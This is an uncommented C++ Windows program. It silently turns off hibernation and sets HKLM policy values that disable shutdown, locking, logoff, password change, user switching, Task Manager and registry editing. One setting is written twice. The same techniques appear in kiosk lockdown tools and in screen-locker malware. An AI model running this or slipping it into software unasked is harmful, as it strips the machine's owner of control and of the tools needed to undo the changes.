#include <windows.h>
#include <iostream>
#include <string>

bool SetRegDWORD(HKEY hRoot, const std::wstring& subKey, const std::wstring& valName, DWORD data) {
    HKEY hKey;
    if (RegCreateKeyExW(hRoot, subKey.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;

    bool res = (RegSetValueExW(hKey, valName.c_str(), 0, REG_DWORD, (const BYTE*)&data, sizeof(DWORD)) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return res;
}

void ExecCmd(const std::wstring& cmd) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    std::wstring fullCmd = L"cmd.exe /c " + cmd;
    if (CreateProcessW(NULL, &fullCmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

int LimitMain(){
    ExecCmd(L"powercfg /hibernate off");
    HKEY root = HKEY_LOCAL_MACHINE;
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoClose", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableLockWorkstation", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", L"NoLogoff", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableChangePassword", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"HideFastUserSwitching", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", 1);
    SetRegDWORD(root, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", 1); 

    return 0;
}
